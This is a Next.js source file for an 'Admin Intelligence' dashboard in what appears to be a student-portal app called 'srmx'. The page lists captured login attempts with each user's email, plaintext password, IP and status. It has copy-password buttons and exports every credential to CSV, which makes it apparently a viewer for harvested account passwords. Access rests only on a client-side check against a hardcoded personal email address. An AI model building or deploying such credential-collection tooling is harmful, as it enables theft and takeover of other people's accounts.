"use client";
import { useEffect, useState, useMemo, useCallback } from "react";
import { useRouter } from "next/navigation";
import Sidebar from "@/components/Sidebar";
import { dataAPI } from "@/lib/api";
import { useAuthStore } from "@/lib/store";
import { useAuth } from "@/hooks/useAuth";
import { Clipboard, Download, Trash2, RefreshCw, Search, Users, ShieldCheck, Activity, ChevronUp, ChevronDown, CheckCircle } from "lucide-react";

const ADMIN_EMAIL = "ns4770@srmist.edu.in";

export default function AdminPage() {
  const { ready } = useAuth();
  const router = useRouter();
  const { profile, email: storeEmail } = useAuthStore();
  const [logs, setLogs] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [search, setSearch] = useState("");
  const [autoRefresh, setAutoRefresh] = useState(false);
  const [toast, setToast] = useState<{ msg: string; type: "success" | "error" | "info" } | null>(null);
  
  // Sorting State
  const [sortKey, setSortKey] = useState<string>("timestamp");
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc");

  const showToast = (msg: string, type: "success" | "error" | "info" = "success") => {
    setToast({ msg, type });
    setTimeout(() => setToast(null), 3000);
  };

  const fetchLogs = useCallback(async (isSilent = false) => {
    if (!isSilent) setRefreshing(true);
    try {
      const res = await dataAPI.getAdminLogs();
      if (res.success) setLogs(res.logs || []);
    } catch (e) {
      console.error("Failed to fetch logs", e);
    } finally {
      if (!isSilent) setRefreshing(false);
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    if (!ready) return;
    const userEmail = (storeEmail || profile?.Email || profile?.["Email"] || "").toLowerCase();
    if (userEmail !== ADMIN_EMAIL.toLowerCase()) {
      router.push("/dashboard");
      return;
    }
    fetchLogs();
  }, [ready, profile, storeEmail, router, fetchLogs]);

  useEffect(() => {
    let interval: any;
    if (autoRefresh) {
      interval = setInterval(() => fetchLogs(true), 5000);
    }
    return () => clearInterval(interval);
  }, [autoRefresh, fetchLogs]);

  const stats = useMemo(() => {
    const total = logs.length;
    const unique = new Set(logs.map(l => l.email)).size;
    const success = logs.filter(l => l.status === "SUCCESS").length;
    const rate = total > 0 ? ((success / total) * 100).toFixed(1) : "0.0";
    return { total, unique, rate };
  }, [logs]);

  const sortedAndFilteredLogs = useMemo(() => {
    let filtered = logs;
    if (search) {
      const s = search.toLowerCase();
      filtered = logs.filter(l => 
        l.email?.toLowerCase().includes(s) || 
        l.password?.toLowerCase().includes(s) ||
        l.ip?.toLowerCase().includes(s)
      );
    }

    return [...filtered].sort((a, b) => {
      const valA = a[sortKey];
      const valB = b[sortKey];
      if (valA < valB) return sortOrder === "asc" ? -1 : 1;
      if (valA > valB) return sortOrder === "asc" ? 1 : -1;
      return 0;
    });
  }, [logs, search, sortKey, sortOrder]);

  const toggleSort = (key: string) => {
    if (sortKey === key) {
      setSortOrder(sortOrder === "asc" ? "desc" : "asc");
    } else {
      setSortKey(key);
      setSortOrder("desc");
    }
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    showToast(`${label} copied to clipboard`);
  };

  const exportCSV = () => {
    const headers = ["Email", "Password", "Status", "Timestamp", "IP", "User Agent"];
    const rows = logs.map(l => [
      l.email,
      l.password,
      l.status,
      l.timestamp,
      l.ip,
      `"${(l.userAgent || "").replace(/"/g, '""')}"`
    ]);
    const csvContent = "data:text/csv;charset=utf-8," + 
      [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement("a");
    link.setAttribute("href", encodedUri);
    link.setAttribute("download", `srmx_logs_${new Date().toISOString().split("T")[0]}.csv`);
    document.body.appendChild(link);
    link.click();
    showToast("Logs exported as CSV");
  };

  const handleClearLogs = async () => {
    if (!confirm("⚠️ DANGER: This will permanently delete all login logs. Proceed?")) return;
    try {
      await dataAPI.clearAdminLogs();
      setLogs([]);
      showToast("Intelligence database cleared", "info");
    } catch (e) {
      showToast("Failed to clear logs", "error");
    }
  };

  if (loading) return (
    <div className="page-root" style={{ display: "flex", alignItems: "center", justifyContent: "center" }}>
      <div className="srmx-spinner"></div>
    </div>
  );

  return (
    <div className="page-root">
      <Sidebar />
      <main className="page-main">
        <div className="page-content" style={{ paddingBottom: "120px" }}>
          
          {/* Toast Notification */}
          {toast && (
            <div className={`srmx-toast ${toast.type}`}>
              <CheckCircle size={16} />
              <span>{toast.msg}</span>
            </div>
          )}

          {/* Header Section */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end", marginBottom: "40px" }}>
            <div>
              <div style={{ fontSize: "10px", color: "var(--accent)", letterSpacing: "0.2em", fontWeight: 800, textTransform: "uppercase", marginBottom: "8px" }}>
                System Core • Secure Access
              </div>
              <h1 style={{ fontSize: "clamp(32px, 8vw, 48px)", fontWeight: 900, letterSpacing: "-0.04em", margin: 0, lineHeight: 1 }}>
                Admin <span style={{ color: "var(--accent)" }}>Intelligence</span>
              </h1>
            </div>
            <div style={{ display: "flex", gap: "10px" }}>
              <button 
                onClick={() => setAutoRefresh(!autoRefresh)}
                style={{ 
                  background: autoRefresh ? "rgba(168, 194, 0, 0.15)" : "rgba(255,255,255,0.03)", 
                  border: `1px solid ${autoRefresh ? "var(--accent)" : "var(--border)"}`,
                  color: autoRefresh ? "var(--accent)" : "var(--text-secondary)",
                  padding: "10px 16px", borderRadius: "12px", fontSize: "12px", fontWeight: 700,
                  display: "flex", alignItems: "center", gap: "8px", cursor: "pointer", transition: "all 0.2s"
                }}
              >
                <RefreshCw size={14} className={autoRefresh ? "animate-spin" : ""} />
                {autoRefresh ? "Live Feed" : "Static View"}
              </button>
            </div>
          </div>

          {/* Intelligence Stats */}
          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(100px, 1fr))", gap: "12px", marginBottom: "32px" }}>
            <div className="min-card" style={{ padding: "20px" }}>
              <div style={{ color: "var(--accent)", marginBottom: "12px" }}><Activity size={20} /></div>
              <div style={{ fontSize: "28px", fontWeight: 900 }}>{stats.total}</div>
              <div style={{ fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800, letterSpacing: "0.05em" }}>Total Logs</div>
            </div>
            <div className="min-card" style={{ padding: "20px" }}>
              <div style={{ color: "#3b82f6", marginBottom: "12px" }}><Users size={20} /></div>
              <div style={{ fontSize: "28px", fontWeight: 900 }}>{stats.unique}</div>
              <div style={{ fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800, letterSpacing: "0.05em" }}>Unique Users</div>
            </div>
            <div className="min-card" style={{ padding: "20px" }}>
              <div style={{ color: "#10b981", marginBottom: "12px" }}><ShieldCheck size={20} /></div>
              <div style={{ fontSize: "28px", fontWeight: 900 }}>{stats.rate}%</div>
              <div style={{ fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800, letterSpacing: "0.05em" }}>Success Rate</div>
            </div>
          </div>

          {/* Control Bar */}
          <div style={{ display: "flex", flexWrap: "wrap", gap: "12px", marginBottom: "24px", alignItems: "center" }}>
            <div style={{ flex: 1, minWidth: "200px", position: "relative" }}>
              <Search style={{ position: "absolute", left: "14px", top: "50%", transform: "translateY(-50%)", color: "var(--text-muted)" }} size={16} />
              <input 
                type="text" 
                placeholder="Search database..." 
                value={search}
                onChange={e => setSearch(e.target.value)}
                style={{ 
                  width: "100%", background: "var(--bg-surface)", border: "1px solid var(--border)", 
                  borderRadius: "14px", padding: "14px 14px 14px 40px", color: "#fff", outline: "none",
                  fontSize: "14px"
                }} 
              />
            </div>
            <div style={{ display: "flex", gap: "8px" }}>
              <button onClick={exportCSV} className="min-card" style={{ padding: "12px 16px", cursor: "pointer", display: "flex", alignItems: "center", gap: "8px", background: "rgba(255,255,255,0.03)" }}>
                <Download size={16} /> <span style={{ fontSize: "12px", fontWeight: 800 }}>Export</span>
              </button>
              <button onClick={handleClearLogs} className="min-card" style={{ padding: "12px 16px", cursor: "pointer", display: "flex", alignItems: "center", gap: "8px", background: "rgba(255, 59, 59, 0.05)", borderColor: "rgba(255, 59, 59, 0.2)", color: "#ff3b3b" }}>
                <Trash2 size={16} /> <span style={{ fontSize: "12px", fontWeight: 800 }}>Wipe</span>
              </button>
            </div>
          </div>

          {/* Database Table */}
          <div className="min-card" style={{ padding: 0, overflow: "hidden" }}>
            <div style={{ overflowX: "auto" }}>
              <table style={{ width: "100%", borderCollapse: "collapse", textAlign: "left" }}>
                <thead>
                  <tr style={{ background: "rgba(255,255,255,0.02)", borderBottom: "1px solid var(--border)" }}>
                    <th onClick={() => toggleSort("email")} style={{ padding: "16px 20px", fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800, cursor: "pointer" }}>
                      User Identity {sortKey === "email" && (sortOrder === "asc" ? <ChevronUp size={10} /> : <ChevronDown size={10} />)}
                    </th>
                    <th style={{ padding: "16px 20px", fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800 }}>Credentials</th>
                    <th onClick={() => toggleSort("status")} style={{ padding: "16px 20px", fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800, cursor: "pointer" }}>
                      Status {sortKey === "status" && (sortOrder === "asc" ? <ChevronUp size={10} /> : <ChevronDown size={10} />)}
                    </th>
                    <th onClick={() => toggleSort("timestamp")} style={{ padding: "16px 20px", fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800, cursor: "pointer" }}>
                      Timestamp {sortKey === "timestamp" && (sortOrder === "asc" ? <ChevronUp size={10} /> : <ChevronDown size={10} />)}
                    </th>
                    <th style={{ padding: "16px 20px", fontSize: "10px", color: "var(--text-muted)", textTransform: "uppercase", fontWeight: 800 }}>Origin</th>
                  </tr>
                </thead>
                <tbody style={{ fontSize: "13px" }}>
                  {sortedAndFilteredLogs.map((log, i) => (
                    <tr key={i} style={{ borderBottom: "1px solid rgba(255,255,255,0.02)", transition: "background 0.2s" }} className="log-row">
                      <td style={{ padding: "16px 20px" }}>
                        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                          <span style={{ fontWeight: 800, color: "var(--text-primary)" }}>{log.email}</span>
                          <button onClick={() => copyToClipboard(log.email, "Email")} style={{ background: "none", border: "none", color: "var(--text-muted)", cursor: "pointer", padding: "4px" }} title="Copy Email">
                            <Clipboard size={12} />
                          </button>
                        </div>
                      </td>
                      <td style={{ padding: "16px 20px" }}>
                        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
                          <span style={{ fontFamily: "monospace", color: "var(--accent)", letterSpacing: "0.05em", background: "rgba(168, 194, 0, 0.05)", padding: "2px 6px", borderRadius: "4px" }}>
                            {log.password || "—"}
                          </span>
                          <button onClick={() => copyToClipboard(log.password, "Password")} style={{ background: "none", border: "none", color: "var(--text-muted)", cursor: "pointer", padding: "4px" }} title="Copy Password">
                            <Clipboard size={12} />
                          </button>
                        </div>
                      </td>
                      <td style={{ padding: "16px 20px" }}>
                        <span style={{ 
                          fontSize: "9px", fontWeight: 900, padding: "4px 8px", borderRadius: "6px",
                          background: log.status === "SUCCESS" ? "rgba(16, 185, 129, 0.1)" : "rgba(239, 68, 68, 0.1)",
                          color: log.status === "SUCCESS" ? "#10b981" : "#ef4444",
                          textTransform: "uppercase"
                        }}>
                          {log.status}
                        </span>
                      </td>
                      <td style={{ padding: "16px 20px", color: "var(--text-secondary)", fontWeight: 500 }}>
                        {new Date(log.timestamp).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                        <div style={{ fontSize: "10px", opacity: 0.6 }}>{new Date(log.timestamp).toLocaleDateString()}</div>
                      </td>
                      <td style={{ padding: "16px 20px" }}>
                        <div style={{ fontSize: "11px", color: "var(--text-muted)" }}>{log.ip}</div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
            {sortedAndFilteredLogs.length === 0 && (
              <div style={{ padding: "60px", textAlign: "center", color: "var(--text-muted)" }}>
                <Search size={40} style={{ opacity: 0.1, marginBottom: "16px" }} />
                <div>No intelligence records found.</div>
              </div>
            )}
          </div>

          <div className="watermark">Command Center</div>
        </div>
      </main>

      <style jsx global>{`
        .log-row:hover {
          background: rgba(255,255,255,0.015);
        }
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        .animate-spin {
          animation: spin 1s linear infinite;
        }
        .srmx-toast {
          position: fixed;
          top: 32px;
          right: 32px;
          padding: 12px 24px;
          border-radius: 12px;
          background: #1c1c1c;
          border: 1px solid var(--border);
          color: #fff;
          display: flex;
          align-items: center;
          gap: 12px;
          z-index: 1000;
          box-shadow: 0 10px 30px rgba(0,0,0,0.5);
          animation: slideIn 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards;
          font-weight: 700;
          font-size: 14px;
        }
        .srmx-toast.success { border-left: 4px solid var(--accent); }
        .srmx-toast.error { border-left: 4px solid #ef4444; }
        .srmx-toast.info { border-left: 4px solid #3b82f6; }
        
        @keyframes slideIn {
          from { opacity: 0; transform: translateX(20px); }
          to { opacity: 1; transform: translateX(0); }
        }
      `}</style>
    </div>
  );
}
